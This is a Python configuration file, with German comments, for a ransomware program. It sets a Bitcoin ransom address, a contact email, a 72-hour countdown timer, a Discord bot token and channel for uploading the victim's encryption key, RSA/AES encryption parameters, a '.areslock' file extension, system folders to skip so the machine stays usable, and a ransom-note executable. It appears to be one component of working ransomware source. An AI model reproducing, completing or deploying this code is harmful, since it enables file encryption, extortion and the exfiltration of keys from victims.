from pathlib import Path

class Config:
    # === Werte für die Lösegeldforderung ===
    BTC_ADDRESS = "1A2b3C4d5E6f7G8h9I0jKLMNOPqrStUv"  # Bitcoin-Adresse
    CONTACT_EMAIL = "unlock@fakedomain.to"            # Kontakt-E-Mail
    COUNTDOWN_HOURS = 72                               # Countdown in Stunden
    TIMER_FILE = "ransom_timer.txt"                   # Timer-Dateiname

    # === Werte für den Upload des Keys auf Discord ===
    TOKEN = "DEIN_DISCORD_BOT_TOKEN"  # Hier deinen Bot Token eintragen
    CHANNEL_ID = 123456789012345678  # Hier die Ziel-Channel-ID eintragen
    FILEPATH = "key.txt"

    # === Werte für die Verschlüsselung ===
    CHUNK_SIZE = 1024  # 1 KB pro Chunk
    CHUNK_SIZE = 5 * 1024 * 1024  # Größe der Chunks beim Lesen großer Dateien (5 MB)
    RSA_PUBLIC_KEY_PATH = Path("public.pem")  # Pfad zum öffentlichen RSA-Schlüssel
    ENCRYPTED_KEY_FILENAME = "key.txt"        # Name der Datei für den verschlüsselten AES-Schlüssel
    LOG_FILE = Path("encryption.log")         # Logdatei für den Verschlüsselungsprozess
    ENCRYPTED_EXTENSION = ".areslock"         # Dateiendung für verschlüsselte Dateien

    # === Verzeichnisse, die bei der Dateisuche ignoriert werden ===
    EXCLUDED_DIRS = [
        Path('C:\\Windows'),                  # Windows-Systemverzeichnis
        Path('C:\\Program Files'),            # Programme
        Path('C:\\Program Files (x86)'),      # 32-Bit-Programme
        Path('C:\\System Volume Information'),# Systeminformationen
        Path('C:\\$Recycle.Bin'),             # Papierkorb
        Path('C:\\Users\\Default'),           # Default-User
        Path('C:\\Users\\Public'),            # Öffentliche Benutzer
        Path('C:\\ProgramData'),              # Programmdaten
        Path('C:\\Recovery')                  # Recovery-Partition
    ]

    # === Werte für das Hauotprogramm ===
    BITCOIN_URL = "https://www.bitcoin.com"  # Zahlungs-URL
    NOTE_PROCESS_NAME = "note.exe"           # Name der Lösegeldforderung
    NOTE_EXE_PATH = r"note.exe"              # Pfad zur Lösegeldforderung